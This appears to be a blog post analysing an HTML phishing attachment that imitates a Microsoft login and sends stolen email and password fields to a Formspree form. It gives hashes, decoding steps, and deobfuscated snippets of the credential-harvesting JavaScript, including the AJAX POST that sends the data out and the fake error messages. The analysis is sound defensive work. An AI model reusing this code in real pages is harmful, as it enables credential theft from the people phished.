---
layout: default
title:  "Threat Actors Manipulating Formspree for SHTML Phishing"
date:   2025-07-27 15:03:00 -0400
categories: malware analysis
---

> MD5 11eaf696e140c3673e504570b7955678

> SHA-1 e4ec118dae227d8a086c98035a1e6e89d6f60283

> SHA-256 e0a14c1a89b709e27fa32e669e354eb5b7a61b33071f81eb6f9a936ed528a4e5

The sample I have analyzed in this post appears to be targeted towards users in organizations utilizing popular Microsoft solutions such as Onedrive, Outlook, and others. The initial vector is (of course) a phishing email with an .HTML attached that contains obfuscated JavaScript that will be handled and executed in the browser, not the OS itself with WScript or CScript. Over the last year, HTML smuggling and other HTML phishing techniques have surged as from the perspective of the threat actors, this is advantageous as it aids in evading security solutions. In this case, threat actors are leveraging a service known as Formspree which allows for sending data to email addresses without a backend.

Examining the .HTML in a text editor reveals “three” lines of code, which are comprised of JavaScript code in an escape block. The escape() function ensures that the string enclosed in the function replaces all characters with escape sequences for obfuscation, with the exception of ASCII characters. With escape(), characters are escaped by UTF-16 code units, and are represented by two hexadecimal numbers (%xx) if the value of the code unit is less than 256.

![Alt text](/assets/images/2025/Formspree/1-java.png)

There are many ways to decode the string, but I chose to use CyberChef’s “From Hex” recipe with the delimiter set to Auto, save it as an .HTML file, and open it in a text editor.

![Alt text](/assets/images/2025/Formspree/2-cyberchef.png)

Decoding the escape block revealed a large HTML file containing several areas of interest. There are several instances of base64 encoded images that are used for logo, blurred background image, and more.

{% highlight ruby %}
background-image:url(data:image/png;base64, …)
{% endhighlight %}

After the encoded PNG images, there is a large obfuscated portion of JavaScript that can be deobfuscated using synchrony.

![Alt text](/assets/images/2025/Formspree/3-synchrony.png)

{% highlight ruby %}
      !/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(w)
    ) {
      return (
        $('#error').show(),
        $('#error').html(
          "That account doesn't exist. Enter a different account"
        ),
        v.focus,
        false
      )
{% endhighlight %}

{% highlight ruby %}
    if (!v) {
      return (
        $('#error').show(),
        $('#error').html('Email field is emply.!'),
        v.focus,
        false
      )
    }
{% endhighlight %}

{% highlight ruby %}
    $.ajax({
      dataType: 'JSON',
      url: atob(s),
      type: 'POST',
      data: E,
      beforeSend: function (J) {
        $('#submit-btn').html('Verifing...')
{% endhighlight %}

{% highlight ruby %}
      success: function (J) {
        if (J) {
          $('#msg').show()
          console.log(J)
          if (J.signal == 'ok') {
            $('#pr').val(''),
              j >= 2 &&
                ((j = 0),
                window.location.replace(
                  'https://www.microsoft.com/en-EN/servicesagreement/'
                ))
{% endhighlight %}

The meat and potatoes of this .HTML is the following:

{% highlight ruby %}$.ajax({
          dataType: 'JSON',
          url: "https://formspree.io/f/redacted",
          type: 'POST',
          data:{
            ai:ai,
            pr:pr,
            detail:detail,

          }
{% endhighlight %}

After the phished user provides an email, password, and clicks the Login button, an AJAX submission is performed which sends a POST request to the provided Formspree URL containing the email (ai) and password (pr”) data entered into the fields. The actual rendered webpage appears as follows.

![Alt text](/assets/images/2025/Formspree/4-formspreepage.png)

Thanks for reading.